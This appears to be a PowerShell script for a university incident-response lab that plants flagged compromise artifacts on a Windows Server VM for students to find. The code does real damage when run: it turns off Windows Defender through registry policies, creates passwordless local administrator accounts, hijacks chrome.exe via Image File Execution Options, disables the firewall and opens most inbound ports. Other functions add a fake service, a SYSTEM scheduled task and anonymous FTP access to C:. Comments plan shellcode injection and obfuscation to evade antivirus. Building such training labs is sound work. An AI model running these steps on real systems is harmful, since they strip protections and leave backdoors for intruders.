$BadAdminsFlag = "ACDLAB6{Never_should_have_come_here}"
$BadAdminName1 = "Spongebob"
$BadAdminName2 = "Patrick"
$BadAdminName3 = "Mr. Krabs"
$BadAdminName4 = "Sandy"
$BadAdminName5 = "Plankton"

$FirewallFlag = "ACDLAB6{They_took_down_our_shields!}"
$SSHFlag = "ACDLAB6{I_think_this_is_the_wrong_OS}"
$CurrentVersionRunFlag = "ACDLAB6{Who_said_you_could_run_on_boot?}"
$NetcatFlag = "ACDLAB6{Nyancat_bootloader_time!}"
$SpawnedCMDFlag = "ACDLAB6{Hey_you_shouldn't_be_running_there}"
$InstalledServiceFlag = "ACDLAB6{Definitely_a_legit_service}"
$TaskSchedulerFlag = "ACDLAB6{Wanna_see_me_run_it_again?}"
$KillFTPIISFlag = "ACDLAB6{Red_team_turned_off_my_services!}"
#$DisableDefenderFlag = "ACDLAB6{Hey_shouldn't_this_thing_be_on?}"
$RDPMisconfigFlag = "ACDLAB6{RDP_is_a_super_secure_protocol}"
#$ImageFileExecutionOptionsFlag = "ACDLAB6{No_chrome_for_you_:)}"
$MapIISToCFlag = "ACDLAB6{Maybe_don't_have_C_publicly_avaialble}"

function DisableDefender {
    New-Item -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\" -Name "Windows Defender" -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Spynet" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWORD -Force -ErrorAction Continue

    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Signature Updates" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Real-Time Protection" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWORD -Force -ErrorAction Continue

    Add-MpPreference -ExclusionPath "C:\ACDLAB6{Do_you_really_need_AV?}" -ErrorAction Continue
}

function MakeAdmins {
    New-LocalUser -Name $BadAdminName1 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName2 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName3 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName4 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName5 -Description $BadAdminsFlag -NoPassword
    Add-LocalGroupMember -Group "Administrators" -Member $BadAdminName1, $BadAdminName2, $BadAdminName3, $BadAdminName4, $BadAdminName5
}

function ImageFileExecutionOptions {
    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -Name "chrome.exe" -Force -ErrorAction Continue
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Debugger" -Value "C:\chrome.exe" -Type String -Force -ErrorAction Continue
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Flag" -Value "ACDLAB6{No_chrome_for_you_:)}" -Type String -Force -ErrorAction Continue
}

function DisableFirewall {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    New-NetFirewallRule -Name "Open Inbound TCP Ports >=)" -DisplayName "Open Inbound TCP Ports" -Description $FirewallFlag -Enabled 1 -Direction Inbound -Action Allow -LocalPort 1-12345 -Protocol TCP
    New-NetFirewallRule -Name "Open Inbound UDP Ports >=)" -DisplayName "Open Inbound UDP Ports" -Description $FirewallFlag -Enabled 1 -Direction Inbound -Action Allow -LocalPort 1-12345 -Protocol UDP
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 
}

function InstallSSH {
    # this needs to be tested, might be easier to get the openssh binary and install server and client from that 

    # [System.Environment]::SetEnvironmentVariable('Path','C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;C:\Windows\System32\OpenSSH-Win64;')
    # C:\Windows\System32\OpenSSH-Win64\install-sshd.ps1
    # Start-Service sshd
    # Set-Service sshd -StartupType Automatic
    # New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH" -Enabled 1 -Direction Inbound -Action Allow -LocalPort 22 -Protocol TCP -erroraction SilentlyContinue

    # drop a text file in the ssh install dir, need to double check location
    New-Item C:\Windows\System32\OpenSSH-Win64\flag.txt
    Set-Content C:\Windows\System32\OpenSSH-Win64\flag.txt $SSHFlag
}

function NetcatListeners {
    # probably replace exe name with flag or something, not sure yet
    # can also put the flag in a text file next to the exe
    # put nc in C:\Windows\Fonts\nc
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1337}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1338}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1339}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1340}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1341}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1342}
    New-Item 'C:\Program Files\nc\flag.txt'
    Set-Content 'C:\Program Files\nc\flag.txt' $NetcatFlag
}

function CurrentVersionRun {
    # Need new names for exes, probably put flags in values next to these
    # maybe create dummy exes that just pop msg box
    # can put flag in strings of file? will need to make sure to cover strings in IR lecture in some capacity
    # New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name NotMalware -Value %SystemRoot%\system32\not_malware.exe -PropertyType ExpandString -Force
    # New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name SuperSafeTotallyLegitProgram -Value %SystemRoot%\system32\SuperSafeTotallyLegitProgram.exe -PropertyType ExpandString -Force
}

function SpawnCMDs {
# https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7.2
# would be pretty easy to just spawn a command prompt
# probably have it repeatedly echo the flag every so often so it shows up
# could have the cmdline options include the flag
# https://github.com/smb01/PowershellTools/blob/master/inject.ps1
# defender is flagging this, might need invoke-obfuscation
# in ./inject.ps1

# need to generate msfvenom shellcode to spawn cmd and run a command and stay open
# probably inject two or three, targets might be explorer or a few svchosts
# itll probably be easiest to just use the script as is
# will need to supply the PIDs at run time
}

function InstallService {
# https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service?view=powershell-7.2

    New-Service -Name "LegitService" -BinaryPathName '"C:\WINDOWS\System32\svchost.exe -k netsvcs"' -DisplayName "Legit Service" -StartupType "Automatic" -Description $InstalledServiceFlag
    Start-Service -Name "LegitService"

}

function TaskScheduler {
    # 'ScheduledTask'
    # {
    #     $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
    #     $ElevatedTriggerRemoval = "schtasks /Delete /TN Updater"

    #     switch ($ElevatedPersistenceOption.Trigger)
    #     {
    #         'AtLogon'
    #         {
    #             $ElevatedTrigger = "schtasks /Create /RU system /SC ONLOGON /TN Updater /TR "
    #         }

    #         'Daily'
    #         {
    #             $ElevatedTrigger = "schtasks /Create /RU system /SC DAILY /ST $($ElevatedPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
    #         }

    #         'Hourly'
    #         {
    #             $ElevatedTrigger = "schtasks /Create /RU system /SC HOURLY /TN Updater /TR "
    #         }

    #         'OnIdle'
    #         {
    #             $ElevatedTrigger = "schtasks /Create /RU system /SC ONIDLE /I 1 /TN Updater /TR "
    #         }

    #         default
    #         {
    #             throw 'Invalid elevated persistence options provided!'
    #         }
    #     }

    #     $ElevatedTrigger = '"' + $ElevatedTrigger + $CommandLine + '"'
    # }

    schtasks /Create /RU system /SC MINUTE /MO 5 /TN "LegitTask" /TR C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive
}

function RDPMisconfig {
    # https://serverfault.com/questions/911131/how-can-i-locate-registry-key-for-group-policy-settings
    # https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/secedit
    # can use this to edit policy?
    # https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/secedit-configure
    # https://www.techrepublic.com/article/solutionbase-using-the-secedit-tool-to-work-with-security-templates/
    # this seems to let me replace the secedit.db with like a template or one that I already have
    # should be able to actually overwrite policy with this, hopefully put flag in somewhere
    # i wonder if i can use a db tool to edit
    # https://www.riptidehosting.com/blog/rd-session-host-security-settings-in-windows-server-2016/
}

function KillFTPIIS {
    Stop-Service W3SVC
    Stop-Service ftpsvc
    # also need to see if I can modify descrition of service
    # https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
    Set-Service -Name W3SVC -Description $KillFTPIISFlag
    Set-Service -Name ftpsvc -Description $KillFTPIISFlag
}

function MapIISToC {
    cmd.exe /C "%windir%\system32\inetsrv\appcmd.exe unlock config -section:system.webServer/handlers"
    $sitenames = Get-IISSite | Where-Object Bindings -Match ".*ftp.*" | Select-Object -ExpandProperty Name
    foreach ($site in $sitenames) {
        Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -filter "system.applicationHost/sites/site[@name='$site']/ftpServer/security/authentication/anonymousAuthentication" -name "enabled" -value "True"
        Set-ItemProperty "IIS:\Sites\$site" -Name physicalPath -Value 'C:'
        # see if I can bind this to a path that doesn't exist
        # ACDLAB6{Maybe_don't_have_C_publicly_avaialble}
    }
}

function BeginMsgBox {
    Add-Type -AssemblyName PresentationFramework
    $msgBoxInput = [System.Windows.MessageBox]::Show('WARNING: This script is for CMSC 491/691 Lab 6. DO NOT RUN THIS ON YOUR HOST MACHINE. It WILL damage your computer. ONLY run this script on your CMSC 491/691 Windows Server 2019 VM. Continue?','Hacking Application','YesNo','Error')
    switch ($msgBoxInput) {
      'Yes' {
        continue
      }
      'No' {
        exit
      }
    }
}

function EndMsgBox {
    Add-Type -AssemblyName PresentationFramework

    $msgBoxInput = [System.Windows.MessageBox]::Show('Hacking complete :)','Hacking Application','YesNoCancel','Error')
    switch ($msgBoxInput) {
      'Yes' {
        [System.Windows.MessageBox]::Show('Thank you for working with me')
      }
      'No' {
        [System.Windows.MessageBox]::Show('That did not seem to work…')
      }
      'Cancel' {
        [System.Windows.MessageBox]::Show('Cannot cancel a job that has already completed')
      }
    }    
}

function Write-ZipUsing7Zip([string]$FilesToZip, [string]$ZipOutputFilePath, [string]$Password, [ValidateSet('7z','zip','gzip','bzip2','tar','iso','udf')][string]$CompressionType = 'zip', [switch]$HideWindow)
{
    # Look for the 7zip executable.
    $pathTo32Bit7Zip = "C:\Program Files (x86)\7-Zip\7z.exe"
    $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
    $THIS_SCRIPTS_DIRECTORY = Split-Path $script:MyInvocation.MyCommand.Path
    $pathToStandAloneExe = Join-Path $THIS_SCRIPTS_DIRECTORY "7za.exe"
    if (Test-Path $pathTo64Bit7Zip) { $pathTo7ZipExe = $pathTo64Bit7Zip }
    elseif (Test-Path $pathTo32Bit7Zip) { $pathTo7ZipExe = $pathTo32Bit7Zip }
    elseif (Test-Path $pathToStandAloneExe) { $pathTo7ZipExe = $pathToStandAloneExe }
    else { throw "Could not find the 7-zip executable." }

    # Delete the destination zip file if it already exists (i.e. overwrite it).
    if (Test-Path $ZipOutputFilePath) { Remove-Item $ZipOutputFilePath -Force }

    $windowStyle = "Normal"
    if ($HideWindow) { $windowStyle = "Hidden" } # just do this?

    # Create the arguments to use to zip up the files.
    # Command-line argument syntax can be found at: http://www.dotnetperls.com/7-zip-examples
    $arguments = "a -t$CompressionType ""$ZipOutputFilePath"" ""$FilesToZip"" -mx9"
    if (!([string]::IsNullOrEmpty($Password))) { $arguments += " -p$Password" }

    # Zip up the files.
    $p = Start-Process $pathTo7ZipExe -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

    # If the files were not zipped successfully.
    if (!(($p.HasExited -eq $true) -and ($p.ExitCode -eq 0)))
    {
        throw "There was a problem creating the zip file '$ZipFilePath'."
    }
}

function Main {

    Set-ExecutionPolicy Bypass

    DisableDefender
    MakeAdmins
    ImageFileExecutionOptions
    DisableFirewall

# bigheck 2>&1 | tee -FilePath c:\windows\fonts\results.txt

# Write-ZipUsing7Zip -FilesToZip "c:\windows\fonts\results.txt" -ZipOutputFilePath "c:\windows\fonts\results.zip" -Password "NotSqordfish:)"

# Remove-Item -Path "c:\windows\fonts\results.txt" -Force

}

Main